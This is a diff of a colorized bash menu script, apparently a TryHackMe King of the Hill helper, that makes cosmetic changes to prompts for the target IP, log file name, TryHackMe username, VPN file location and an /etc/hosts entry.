+          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}Target Log Name${BBlue}: ${BGreen}${targetLogNAME}
+          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}TryHackMe UserName${BBlue}: ${BGreen}${username}
+          ${BBlue}[${BYellow}#${BBlue}] 🗓  ${BYellow}Current Date${BBlue}: ${BGreen} $(date)
           ${BYellow}=======================================================================================
           ${BRed}[${DGrey}I${BRed}]${BBlue} - ${DGrey}Install HacKingPro On the System")
 
@@ -1156,15 +1517,12 @@ MainMenu(){
           echo "$HacKingProTargetStatus""
 
           ${BRed}[${LGrey}a${BRed}]${BBlue} -${DGrey} Anonymity Surfing
-          ${BRed}[${LGrey}a${BRed}]${BBlue} -${DGrey} Anonymity Surfing
-
-          ${BRed}[${BBlue}i${BRed}]${BBlue} -${BBlue} Installing KoTH on The System
 
           ${BRed}[${LGrey}x${BRed}]${BWhite} -${DGrey} Exit / Quit / Close
 
 
-                ${BCyan}  ┌──${BBlue}[${BCyan} Anlominus 👽${BYellow} KoTH ${BCyan} ~$(pwd) ${BCyan}$~${BBlue}]
-                ${BCyan}  └──╼ ${BGreen}")
+          ${BCyan}┌──${BBlue}[${BCyan} Anlominus 👽${BYellow} KoTH ${BCyan} ~$(pwd) ${BCyan}$~${BBlue}]
+          ${BCyan}└──╼ ${BGreen}")
           read -p "$KoTHMenuMain" cmd
           case $cmd in
             i )
@@ -1176,14 +1534,14 @@ MainMenu(){
             1 )
             echo "\n\t\t${BRed}[${BBlue}1${BRed}]${BWhite} - ${BRed}Planning and Scoping"
             #
-            t1="$(echo "\n\t\t${BBlue}[${BYellow}?${BBlue}]${BGreen} - IP / Host of Target / Client: ${BRed}")"
+            t1="$(echo "\n${BBlue}[${BYellow}?${BBlue}]${BGreen} - IP / Host of Target / Client: ${BRed}")"
             read -p "$t1" targetIP
             if [ -z $targetIP ]; then
               #statements
               targetIP="127.0.0.1"
             fi
             #
-            t2="$(echo "\n\t\t${BBlue}[${BYellow}?${BBlue}]${BGreen} - Name of Target / Client: ${BRed}")"
+            t2="$(echo "\n${BBlue}[${BYellow}?${BBlue}]${BGreen} - Name of Target / Client: ${BRed}")"
             read -p "$t2" targetLogNAME
             if [ -z $targetLogNAME ]; then
               #statements
@@ -1193,7 +1551,7 @@ MainMenu(){
             #
             file="${targetLogNAME}-KoTH-Log.md"
             if [ -e ${file} ]; then
-              t2="$(echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BRed} - File Exist! Remove it? [yY/nN]: ")"
+              t2="$(echo "\n${BBlue}[${BRed}!${BBlue}]${BRed} - File Exist! Remove it? [yY/nN]: ")"
               read -p "$t2 " filexist
               case $filexist in
                 y|Y)
@@ -1230,7 +1588,7 @@ MainMenu(){
             echo "---" >> ${targetLogNAME}-KoTH-Log.md
 
             # Define variable for THM username
-            read_username=$(echo "\n\t\t${BBlue}[${BRed}?${BBlue}]${BGreen} - What Your User Name on TryHackMe: ${BRed} ")
+            read_username=$(echo "\n${BBlue}[${BRed}?${BBlue}]${BGreen} - What Your User Name on TryHackMe: ${BRed} ")
             read -p "$read_username" Alm
             if [ -z $Alm ]; then
               #statements
@@ -1257,7 +1615,7 @@ MainMenu(){
               #statements
               echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Found TryHackme VPN File ~>: $DGrey  $vpn_file  \n"
             else
-              cant_found=$(echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BRed} - Sorry Can't Found TryHackme VPN File !! \n\n\t\t  Enter $username.ovpn Location ~>: ")
+              cant_found=$(echo "\n${BBlue}[${BRed}!${BBlue}]${BRed} - Sorry Can't Found TryHackme VPN File !! \n\n\t\t  Enter $username.ovpn Location ~>: ")
               read -p "$cant_found"  this_location
               if [ -e $this_location ]; then
                 #statements
@@ -1344,7 +1702,7 @@ MainMenu(){
               echo "\n\n\t\t  $cyan $(ps aux | grep $vpn_file) \n"
             }
 
-            hostsModify="$(echo "\n\t\t${BBlue}[${BYellow}?${BBlue}] 🔶 ${BGreen}Adding ${BYellow}$targetIP ${targetLogNAME} ${BGreen}to /etc/hosts? [y|Y] or [press ENTER]   ")"
+            hostsModify="$(echo "\n${BBlue}[${BYellow}?${BBlue}] 🔶 ${BGreen}Adding ${BYellow}$targetIP ${targetLogNAME} ${BGreen}to /etc/hosts? [y|Y] or [press ENTER]   ")"
             read -p "$hostsModify" hostsMod
             case $hostsMod in
               y|Y|yes|YES )
